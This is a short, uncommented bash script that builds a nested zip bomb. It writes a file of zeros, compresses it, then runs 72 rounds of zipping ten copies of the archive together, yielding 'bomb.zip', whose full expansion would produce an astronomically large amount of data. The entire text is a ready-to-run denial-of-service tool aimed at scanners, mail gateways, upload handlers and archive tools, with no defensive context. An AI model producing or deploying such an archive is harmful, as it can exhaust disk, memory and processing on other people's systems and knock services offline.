#!/bin/bash
zeros=0
touch bomb.txt
until [ $zeros -gt 1000000 ]
do
echo 0000000000 >> bomb.txt
zeros=$((zeros + 10))
done
##########
zip -9q bomb.zip bomb.txt
##########
  timesrun=0
until [ $timesrun -gt 71 ]
do
cp bomb.zip bomb2.zip
cp bomb.zip bomb3.zip
cp bomb.zip bomb4.zip
cp bomb.zip bomb5.zip
cp bomb.zip bomb6.zip
cp bomb.zip bomb7.zip
cp bomb.zip bomb8.zip
cp bomb.zip bomb9.zip
mv bomb.zip bomb10.zip
zip -9q bomb.zip *.zip
rm bomb2.zip bomb3.zip bomb4.zip bomb5.zip bomb6.zip bomb7.zip bomb8.zip bomb9.zip bomb10.zip
timesrun=$((timesrun + 1))
done
rm bomb.txt
